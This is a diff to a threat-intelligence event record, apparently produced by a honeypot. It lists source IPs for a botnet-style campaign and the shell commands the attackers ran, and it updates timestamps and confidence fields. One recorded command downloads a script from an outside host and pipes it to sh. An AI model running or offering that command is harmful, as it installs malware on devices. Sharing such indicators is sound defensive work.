@@ -2,7 +2,7 @@
   "Event": {
     "uuid": "35c8dd94-5f67-524b-8314-2ff0e0839181",
     "info": "Sundew honeypot - campaign 96a50e508b0a (3 sources) - sh",
-    "date": "2026-08-31",
+    "date": "2026-09-03",
     "analysis": "2",
     "threat_level_id": "3",
     "published": true,
@@ -26,10 +26,10 @@
         "uuid": "1bbc92e9-79ce-5e8b-b222-f9c27c58858c",
         "type": "ip-src",
         "category": "Network activity",
-        "to_ids": true,
+        "to_ids": false,
         "value": "178.163.117.217",
-        "timestamp": "1788163211",
-        "comment": "delivered_payload, confidence high; 50 sessions, 385 commands, 48 downloads; first_seen 2026-08-27T19:12:36.910224Z, last_seen 2026-08-27T21:40:39.842945Z; expires 7d after last_seen"
+        "timestamp": "1788472813",
+        "comment": "persistent, confidence medium; 50 sessions, 385 commands, 48 downloads; first_seen 2026-08-27T19:12:36.910224Z, last_seen 2026-08-27T21:40:39.842945Z; expires 7d after last_seen"
       },
       {
         "uuid": "762d87ad-80ad-5b4c-be57-4828f586d3e3",
@@ -37,7 +37,7 @@
         "category": "Network activity",
         "to_ids": true,
         "value": "180.149.210.43",
-        "timestamp": "1788163211",
+        "timestamp": "1788472813",
         "comment": "delivered_payload, confidence high; 6 sessions, 49 commands, 6 downloads; first_seen 2026-08-29T20:30:30.323905Z, last_seen 2026-08-29T20:45:44.621424Z; expires 7d after last_seen"
       },
       {
@@ -46,7 +46,7 @@
         "category": "Network activity",
         "to_ids": true,
         "value": "186.125.212.120",
-        "timestamp": "1788163211",
+        "timestamp": "1788472813",
         "comment": "delivered_payload, confidence high; 50 sessions, 385 commands, 48 downloads; first_seen 2026-08-31T04:01:33.609986Z, last_seen 2026-08-31T06:26:45.533306Z; expires 7d after last_seen"
       },
       {
@@ -55,7 +55,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "sh",
-        "timestamp": "1788163211",
+        "timestamp": "1788472813",
         "comment": "command run by this campaign"
       },
       {
@@ -64,7 +64,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "shell",
-        "timestamp": "1788163211",
+        "timestamp": "1788472813",
         "comment": "command run by this campaign"
       },
       {
@@ -73,7 +73,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "enable",
-        "timestamp": "1788163211",
+        "timestamp": "1788472813",
         "comment": "command run by this campaign"
       },
       {
@@ -82,7 +82,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "system",
-        "timestamp": "1788163211",
+        "timestamp": "1788472813",
         "comment": "command run by this campaign"
       },
       {
@@ -91,7 +91,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "ping; sh",
-        "timestamp": "1788163211",
+        "timestamp": "1788472813",
         "comment": "command run by this campaign"
       },
       {
@@ -100,7 +100,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "/bin/busybox STC",
-        "timestamp": "1788163211",
+        "timestamp": "1788472813",
         "comment": "command run by this campaign"
       },
       {
@@ -109,7 +109,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "/bin/busybox wget; /bin/busybox STC",
-        "timestamp": "1788163211",
+        "timestamp": "1788472813",
         "comment": "command run by this campaign"
       },
       {
@@ -118,7 +118,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;",
-        "timestamp": "1788163211",
+        "timestamp": "1788472813",
         "comment": "command run by this campaign"
       }
     ]
